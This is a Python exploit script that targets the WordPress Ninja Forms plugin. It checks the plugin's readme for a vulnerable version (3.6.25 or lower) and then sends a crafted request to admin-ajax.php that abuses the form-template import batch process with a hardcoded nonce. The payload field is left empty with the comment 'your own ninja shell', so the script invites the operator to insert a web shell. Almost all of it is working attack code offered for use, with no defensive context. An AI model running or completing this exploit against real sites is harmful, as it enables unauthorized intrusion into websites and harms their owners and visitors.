import requests
from sys import argv
import re
from packaging import version

url = argv[-1]
if url[-1] == "/":
    url = url.rstrip("/")

def print_ninja_art():
    ninja_art = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣶⣶⣶⠶⠾⠿⠿⠷⣷⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣤⣶⠄⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⠀⠀⠀⠀
⠀⠀⣠⡾⢫⣿⠀⠀⠀⠀⠀⠀⢀⣴⣾⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣶⣾⠿⠿⠛⠛⠛⠛⠿⢷⣦⡀
⠀⣰⡿⠁⢸⣿⠀⠀⠀⠀⠀⣠⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⡄⠀⠀⠀⠀⠀⠀⣀⣤⣾⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷
⢠⣿⠁⠀⢸⣿⠀⠀⠀⠀⣼⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⣿⣆⠀⢀⣠⣴⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿
⢸⡇⠀⠀⢸⣿⠀⠀⠀⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠛⢻⣿⣿⠛⢉⣠⣤⣴⣶⣶⣶⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⣠⣾⠟
⣿⡇⠀⠀⢸⣿⠀⠀⠀⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡏⠀⡴⠋⠘⣿⡿⠛⠋⠉⠁⠀⠀⠀⠀⠈⠉⠛⠿⣿⣦⣄⢀⣴⡿⠃⠀
⢿⡇⠀⡄⠀⣿⡀⠀⢸⣿⠻⣿⣿⣦⣤⢤⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣶⣶⣿⡇⠞⠁⠀⢉⣿⡟⠛⠻⠿⢿⣶⣦⣄⠀⠀⠀⠀⠀⠈⠙⠻⠿⠛⠁⠀⠀
⢸⣇⠀⢱⠀⣿⡇⠀⠸⣿⠀⣿⡿⣿⣿⣧⠀⠀⢀⣈⣽⣿⣿⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣫⣿⣷⣶⣿⣿⡿⠿⣧⠀⠀⠀⠀⠀⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⣿⡄⠈⣆⢹⣧⣀⡄⣿⡇⣿⢱⠘⣏⠉⠀⠀⠘⠛⠛⠛⠛⣻⡿⢿⠋⠉⠉⠙⠻⢿⣦⡀⠀⠀⠀⣠⠞⠁⢠⣿⠃⠀⢹⣧⠀⠀⠀⠀⠀⠀⠙⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⣿⣤⣼⠿⠟⢻⣇⢻⣷⠹⡎⢧⣸⠀⠀⠀⠀⠀⠀⠀⣸⡟⠁⢸⠀⠀⠀⠀⠀⠀⢙⣿⣆⡠⠞⠁⠀⣠⣿⠏⠀⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⢻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣴⡾⠛⠉⠀⠀⣠⣾⣿⣼⣿⡏⠛⠢⣭⣄⡀⠀⠀⠀⠀⢠⡟⠀⠀⠈⣆⠀⠀⠀⠀⣀⡾⠞⠉⠀⠀⣀⣴⡿⠋⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠸⣯⠀⣀⣴⠿⡏⠁⠙⠛⠛⠿⢷⣶⣤⣄⣉⠉⠒⠒⠲⠤⠤⠤⠤⠤⠼⠷⠖⠒⠉⠁⠀⠀⢀⣤⣾⠿⠋⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠻⠟⠙⣿⣄⠹⣄⠀⣦⡀⠀⠀⠈⠉⠛⠿⢿⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣾⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⢠⣿⠇⠀⠀⠀⣀⣀⣤⣼⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢰⣾⠛⣠⣼⠿⢻⣿⣷⣤⡀⠀⠀⠀⠀⠀⠉⠙⠻⠿⣷⣦⣤⣶⣶⡾⢿⣿⡛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣤⣴⣾⠿⠟⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⠿⠻⣧⠀⠀⠻⣦⠙⢿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⠦⠄⢻⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⢹⣷⠀⠈⠙⢿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠻⣧⡾⠟⠁⠀⠀⣠⣿⡟⠙⠛⠿⣷⣦⣄⡀⠀⠀⠀⠀⠀⣠⡄⠙⢿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠋⠀⠀⠀⠀⠀⠈⠉⠉⠛⠒⠀⠀⣴⡏⠀⠀⠀⠈⠻⣷⣄⣠⣴⡶⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣟⢿⣦⣄⠀⠀⠀⠈⠛⠿⡁⣠⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠃⠑⠦⢤⣀⣀⡀⠀⠀⠀⠀⠀⣀⣀⣘⣿⡀⠙⠿⣷⣄⠀⠀⠀⣠⠛⢿⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠏⠙⠦⢄⣀⣀⠀⠈⠉⠉⠉⠉⠉⣀⣀⡠⢿⣷⠀⡀⠈⠛⠿⠶⠿⠶⠶⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡿⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠻⣿⡝⢢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢃⣤⣤⣀⡀⠀⣠⣾⣶⣶⣦⣤⣤⣤⣤⣤⣤⠀⠀⢙⣿⣦⡹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⠒⠒⠒⠤⢬⣽⡿⠋⠀⠈⠉⠉⠉⠛⢿⣦⣴⠒⣋⡥⠔⠻⣷⣵⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡇⠀⠀⠀⢠⣾⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣀⠀⠀⠀⢈⣿⡧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢿⣥⣿⣷⣶⣶⣶⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣻⠿⠿⠿⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    print(ninja_art)

def exploit():
    payload = '' # your own ninja shell

    response = requests.post(f"{url}/wp-admin/admin-ajax.php", data={"action": "nf_batch_process", "batch_type": "import_form_template", "security": "e29f2d8dca", "extraData[template]": "formtemplate-contactformd", "method_override": "_respond", "data": payload})

    if response.status_code == 200:
        print("[+] Payload sent successfully!")
        print("[+] Server response:")
        print(response.text)
    else:
        print("[-] Failed to send payload.")
        print(f"[-] Response code: {response.status_code}")

def check_vulnerable():
    try:
        response = requests.get(f"{url}/wp-content/plugins/ninja-forms/readme.txt")
        if response.status_code == 200 and "ninja-forms" in response.text:
            version_match = re.search(r"Stable tag:\s*([\d.]+)", response.text, re.M)
            if version_match:
                plugin_version = version.parse(version_match.group(1))
                if plugin_version <= version.parse("3.6.25"):
                    print(f"[*] Vulnerable Ninja Forms version {plugin_version} detected!")
                    return True
                else:
                    print(f"[-] Ninja Forms version {plugin_version} is not vulnerable.")
        else:
            print("[-] Ninja Forms plugin not found.")
    except Exception as error:
        print(f"[-] Error: {error}")

    return False


if __name__ == "__main__":
    print_ninja_art()
    if check_vulnerable():
        exploit()
